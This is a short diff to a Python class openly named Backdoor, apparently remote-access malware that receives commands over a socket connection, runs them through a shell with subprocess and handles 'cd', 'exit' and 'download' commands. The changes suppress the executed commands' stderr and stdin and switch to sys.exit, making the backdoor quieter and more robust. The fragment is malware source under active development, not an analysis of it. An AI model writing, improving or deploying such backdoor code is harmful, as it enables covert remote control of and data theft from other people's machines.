@@ -3,6 +3,7 @@ import json
 import socket
 import subprocess
 import base64
+import sys
 
 
 class Backdoor:
@@ -39,7 +40,7 @@ class Backdoor:
         
 
     def exec_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
 
     def run(self):
@@ -48,7 +49,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.con.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_dir(command[1])
                 elif command[0] == "download":
